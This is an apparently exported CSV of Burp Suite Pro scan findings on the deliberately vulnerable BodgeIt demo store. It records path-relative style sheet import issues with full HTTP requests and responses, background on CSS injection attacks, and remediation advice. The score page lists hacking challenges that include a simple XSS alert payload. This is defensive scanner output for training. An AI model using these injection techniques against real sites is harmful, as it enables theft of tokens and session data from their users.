"DemoApps","","Bodgeit","53","Path-relative style sheet import","","Info","Open","2015-10-15","Burp Suite Pro","73","External Control of File Name or Path","","/bodgeit/home.jsp","","","http://localhost:8080/bodgeit/home.jsp","","GET /bodgeit/home.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 3197 Date: Mon, 28 Mar 2016 20:11:04 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Our Best Deals!</h3> <center><table border=""1"" class=""border"" width=""80%""> <tr><th>Product</th><th>Type</th><th>Price</th></tr> <tr> <td><a href=""product.jsp?prodid=31"">Youknowwhat</a></td><td>Whatchamacallits</td><td align=""right"">$4.32</td> </tr> <tr> <td><a href=""product.jsp?prodid=22"">GZ XT4</a></td><td>Gizmos</td><td align=""right"">$4.45</td> </tr> <tr> <td><a href=""product.jsp?prodid=21"">Whatsit sound like</a></td><td>Whatsits</td><td align=""right"">$2.90</td> </tr> <tr> <td><a href=""product.jsp?prodid=30"">Mindblank</a></td><td>Whatchamacallits</td><td align=""right"">$1.00</td> </tr> <tr> <td><a href=""product.jsp?prodid=7"">Thingie 4</a></td><td>Thingies</td><td align=""right"">$3.50</td> </tr> <tr> <td><a href=""product.jsp?prodid=30"">Mindblank</a></td><td>Whatchamacallits</td><td align=""right"">$1.00</td> </tr> <tr> <td><a href=""product.jsp?prodid=30"">Mindblank</a></td><td>Whatchamacallits</td><td align=""right"">$1.00</td> </tr> <tr> <td><a href=""product.jsp?prodid=3"">Weird Widget</a></td><td>Widgets</td><td align=""right"">$4.70</td> </tr> <tr> <td><a href=""product.jsp?prodid=25"">GZ K77</a></td><td>Gizmos</td><td align=""right"">$3.05</td> </tr> <tr> <td><a href=""product.jsp?prodid=16"">TGJ JJJ</a></td><td>Thingamajigs</td><td align=""right"">$0.80</td> </tr> </table></center><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold. Issue Background: <p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p> <ol> <li>A response contains a style sheet import that uses a path-relative URL (for example, the page at ""/original-path/file.php"" might import ""styles/main.css"").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, ""/original-path/file.php/extra-junk/""). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li> <li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL ""/original-path/file.php/extra-junk/styles/main.css""), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol> <p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate. Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p> <ul> <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li> <li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>","<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p> <ul><li>Setting the HTTP response header ""X-Frame-Options: deny"" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. ""&lt;!doctype html&gt;"") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li> <li>Setting the HTTP response header ""X-Content-Type-Options: no sniff"" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>","","",""
"DemoApps","","Bodgeit","45","Path-relative style sheet import","","Info","Open","2015-10-15","Burp Suite Pro","73","External Control of File Name or Path","","/bodgeit/login.jsp","","","http://localhost:8080/bodgeit/login.jsp","","GET /bodgeit/login.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/ Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2462 Date: Mon, 28 Mar 2016 20:11:06 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Login</h3> Please enter your credentials: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username:</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password"" name=""password"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Login""></input></td> </tr> </table> </center> </form> If you dont have an account with us then please <a href=""register.jsp"">Register</a> now for a free account. <br/><br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold. Issue Background: <p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p> <ol> <li>A response contains a style sheet import that uses a path-relative URL (for example, the page at ""/original-path/file.php"" might import ""styles/main.css"").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, ""/original-path/file.php/extra-junk/""). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li> <li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL ""/original-path/file.php/extra-junk/styles/main.css""), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol> <p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate. Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p> <ul> <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li> <li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>","<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p> <ul><li>Setting the HTTP response header ""X-Frame-Options: deny"" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. ""&lt;!doctype html&gt;"") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li> <li>Setting the HTTP response header ""X-Content-Type-Options: no sniff"" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>","","",""
"DemoApps","","Bodgeit","55","Path-relative style sheet import","","Info","Open","2015-10-15","Burp Suite Pro","73","External Control of File Name or Path","","/bodgeit/product.jsp","","","http://localhost:8080/bodgeit/product.jsp","","GET /bodgeit/product.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2279 Date: Mon, 28 Mar 2016 20:11:08 GMT Connection: close <script type=""text/javascript""> function incQuantity () { var q = document.getElementById('quantity'); if (q != null) { var val = ++q.value; if (val > 12) { val = 12; } q.value = val; } } function decQuantity () { var q = document.getElementById('quantity'); if (q != null) { var val = --q.value; if (val < 1) { val = 1; } q.value = val; } } </script> <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold. Issue Background: <p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p> <ol> <li>A response contains a style sheet import that uses a path-relative URL (for example, the page at ""/original-path/file.php"" might import ""styles/main.css"").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, ""/original-path/file.php/extra-junk/""). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li> <li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL ""/original-path/file.php/extra-junk/styles/main.css""), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol> <p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate. Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p> <ul> <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li> <li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>","<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p> <ul><li>Setting the HTTP response header ""X-Frame-Options: deny"" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. ""&lt;!doctype html&gt;"") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li> <li>Setting the HTTP response header ""X-Content-Type-Options: no sniff"" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>","","",""
"DemoApps","","Bodgeit","69","Path-relative style sheet import","","Info","Open","2015-10-15","Burp Suite Pro","73","External Control of File Name or Path","","/bodgeit/register.jsp","","","http://localhost:8080/bodgeit/register.jsp","","GET /bodgeit/register.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/login.jsp Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32; b_id=2","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2485 Date: Mon, 28 Mar 2016 20:11:16 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Register</h3> Please enter the following details to register with us: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username (your email address):</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password1"" name=""password1"" type=""password""></input></td> </tr> <tr> <td>Confirm Password:</td> <td><input id=""password2"" name=""password2"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Register""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold. Issue Background: <p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p> <ol> <li>A response contains a style sheet import that uses a path-relative URL (for example, the page at ""/original-path/file.php"" might import ""styles/main.css"").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, ""/original-path/file.php/extra-junk/""). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li> <li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL ""/original-path/file.php/extra-junk/styles/main.css""), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol> <p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate. Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p> <ul> <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li> <li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>","<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p> <ul><li>Setting the HTTP response header ""X-Frame-Options: deny"" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. ""&lt;!doctype html&gt;"") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li> <li>Setting the HTTP response header ""X-Content-Type-Options: no sniff"" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>","","",""
"DemoApps","","Bodgeit","49","Path-relative style sheet import","","Info","Open","2015-10-15","Burp Suite Pro","73","External Control of File Name or Path","","/bodgeit/score.jsp","","","http://localhost:8080/bodgeit/score.jsp","","GET /bodgeit/score.jsp HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/about.jsp Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32; b_id=2","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 4058 Date: Mon, 28 Mar 2016 20:11:17 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Your Score</h3> Here are at least some of the vulnerabilities that you can try and exploit:<br/><br/> <center><table class=""border"" width=""80%""> <tr><th>Challenge</th><th>Done?</th></tr> <tr> <td>Login as test@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Login as user1@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Login as admin@thebodgeitstore.com</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Find hidden content as a non admin user</td> <td> <img src=""images/152.png"" alt=""Completed"" title=""Completed"" border=""0""> </td> </tr> <tr> <td>Find diagnostic data</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Level 1: Display a popup using: &lt;script&gt;alert(""XSS"")&lt;/script&gt;.</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Level 2: Display a popup using: &lt;script&gt;alert(""XSS"")&lt;/script&gt;</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Access someone elses basket</td> <td> <img src=""images/154.png"" alt=""Not implemented/tested yet :("" title=""Not implemented/tested yet :("" border=""0""> </td> </tr> <tr> <td>Get the store to owe you money</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Change your password via a GET request</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Conquer AES encryption, and display a popup using: &lt;script&gt;alert(""H@cked A3S"")&lt;/script&gt;</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> <tr> <td>Conquer AES encryption and append a list of table names to the normal results.</td> <td> <img src=""images/151.png"" alt=""Not completed"" title=""Not completed"" border=""0""> </td> </tr> </table></center> <br/> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The response contains a path-relative style sheet import, and so condition 1 for an exploitable vulnerability is present (see issue background). The response can also be made to render in a browser's quirks mode. The page does not contain a doctype directive, and so it will always be rendered in quirks mode. Further, the response does not prevent itself from being framed, so an attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.) This means that condition 3 for an exploitable vulnerability is probably present if condition 2 is present.<br><br>Burp was not able to confirm that the other conditions hold, and you should manually investigate this issue to confirm whether they do hold. Issue Background: <p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p> <ol> <li>A response contains a style sheet import that uses a path-relative URL (for example, the page at ""/original-path/file.php"" might import ""styles/main.css"").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, ""/original-path/file.php/extra-junk/""). When superfluous data is added to the original URL, the application's response 